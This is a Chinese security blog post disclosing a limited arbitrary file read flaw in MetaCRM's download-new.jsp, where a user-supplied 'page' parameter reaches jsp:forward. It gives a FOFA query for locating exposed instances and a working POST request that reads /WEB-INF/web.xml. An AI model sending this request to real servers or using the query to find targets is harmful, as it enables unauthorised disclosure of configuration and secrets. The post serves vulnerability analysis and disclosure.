---
title: "MetaCRM 客户关系管理系统 download-new.jsp 任意文件读取漏洞"
source: https://mrxn.net/jswz/metasoft-download-new-fileread.html
asset_dir: assets/metacrm-客户关系管理系统-download-new.jsp-任意文件读取漏洞
---

# MetaCRM 客户关系管理系统 download-new.jsp 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/19 13:47
- 1154浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

脚本语言

SQL

scripts

---

# 漏洞简介

MetaCRM是一款智能平台化CRM[软件](#),通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM download-new.jsp 接口存在[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)(有限的),攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取设备上任意文件内容，造成敏感信息泄露。

客户关系管理

# 影响版本

# fofa语法

> body="/common/[scripts](#)/basic.js" && body="www.metacrm.com.cn"
>
> 漏洞修复方案

# 漏洞分析

直接看 `/business/common/download-new.jsp` 的页面实现

```
<%@ page contentType="text/html;charset=utf-8"%>
<%@ page import="java.net.URLEncoder" %>
<%
String strFileName=(String)request.getParameter("filename");
String strPage=(String)request.getParameter("page");
com.metasoft.framework.pub.util.UserState us = com.metasoft.framework.model.users.UserManager.getUserBySessionId(session.getId());
com.metasoft.framework.pub.locale.ResourceService ress=null;
if (us!=null) {
  ress=us.getRess();
}
if (ress==null)
  ress=new com.metasoft.framework.pub.locale.ResourceService();
com.metasoft.Debug.print("1:"+strFileName);
strFileName=URLEncoder.encode(strFileName,"UTF-8");
//strFileName=new String(strFileName.getBytes(),"ISO8859-1");
//strFileName=new String(strFileName.getBytes("UTF-8"),"ISO8859-1");
com.metasoft.Debug.print("2:"+strFileName);
%>

<%
response.setCharacterEncoding("utf-8");
response.setContentType("application/x-msdownload");
response.setHeader("content-disposition", "attachment; filename=\"" + strFileName+ "\";");
%>
<jsp:forward page="<%=strPage%>"/>
<script language="JavaScript">
    window.close();
</script>
```

乍一看,没有看到文件操作相关函数或者方法啊!!!,但是在最后的 `<jsp:forward page="<%=strPage%>"/>` 还是有端倪啊,请看有关jsp的forward语法解释:

物流软件安全

### 1. 语法简单解释

JSP forward的语法非常简单，就是一个XML风格的标签，用于将当前页面的请求“转发”到另一个页面。基本格式是：

```
<jsp:forward page="目标页面路径" />
```

- **page属性**：必填，指定要转发的目标页面，比如另一个JSP文件、Servlet或其他资源。路径可以是相对路径（如"target.jsp"）或绝对路径（如"/WEB-INF/target.jsp"）。
- 可选参数：你可以添加子标签`<jsp:param>`来传递参数，比如：

  ```
  <jsp:forward page="target.jsp">
    <jsp:param name="username" value="张三" />
  </jsp:forward>
  ```

  这会把参数附加到请求中，转发过去。

注意：这个标签必须放在JSP页面的合适位置，一旦执行，它会立即停止当前页面的剩余代码执行。

脚本语言

深入探索

恶意软件分析工具

漏洞预警服务

技术文章订阅

### 2. 实现逻辑

JSP forward是服务器端的一种“内部跳转”机制，核心是基于Java Servlet的技术实现（JSP本质上就是Servlet的变种）。

- **底层原理**：当JSP引擎（比如Tomcat）解析到`<jsp:forward>`标签时，它会调用`RequestDispatcher`接口的`forward()`方法。这个方法会把当前的HTTP请求（request）和响应（response）对象，直接传递给目标页面。
- **关键点**：
  - 转发发生在服务器内部，不会改变浏览器的URL地址（用户看不到变化）。
  - 原请求的所有数据（如参数、属性）都会被带到目标页面。
  - 它不像重定向（redirect）那样会发回浏览器再请求新页面，而是服务器自己“接力”处理。
- **适用场景**：常用于MVC模式中，控制器处理完逻辑后转发到视图页面，或者错误处理时跳转到错误页。

简单说，实现逻辑就像服务器内部的“传球”：当前页面不处理了，把球（请求）直接扔给下一个页面继续玩。

漏洞修复方案

### 3. 处理逻辑

JSP引擎处理`<jsp:forward>`的逻辑是这样的（步步拆解）：

1. **解析阶段**：JSP页面被编译成Servlet类时，`<jsp:forward>`会被转换成Java代码，类似于`request.getRequestDispatcher("target.jsp").forward(request, response);`。
2. **执行阶段**：
   - 当代码运行到这个标签时，JSP会立即停止当前页面的剩余执行（包括后面的HTML或[脚本](#)）。
   - 检查目标页面是否存在，如果不存在，会抛出异常（比如404）。
   - 把当前request和response对象传递给目标页面。
   - 目标页面开始执行，并生成响应内容，最终返回给浏览器。
3. **注意事项**：
   - 转发后，response不能已经提交（比如已经输出内容），否则会报错。
   - 可以多次转发，但要避免无限循环。
   - 参数传递通过`<jsp:param>`或request.setAttribute()实现。

处理逻辑的核心是“中断并转移”：当前页面说“我不干了”，就把活儿全推给别人。

计算机服务器

OK,看完了AI的解释,懂了吗? 因此它是**有限**的[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞,只能读取静态不被tomcat解析的文件如web.xml这类,否则极有可能在后台解析过程中报错,但同时也可以用它来执行一些可以get传参的页面进行“隐蔽”利用?

# 漏洞复现

```
POST /business/common/download-new.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

filename=1.png&page=/WEB-INF/web.xml
```

[![MetaCRM 客户关系管理系统 download-new.jsp 任意文件读取漏洞](images/img-001-3eb5ef858ae8.webp)](https://image.mrxn.net/bd372cc7a728438fab495cbbf292cb40.webp)

成功读取到 web.xml 文件内容.

脚本语言

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.1. 语法简单解释](#toc-4-1-)
- [4.2.2. 实现逻辑](#toc-4-2-)
- [4.3.3. 处理逻辑](#toc-4-3-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
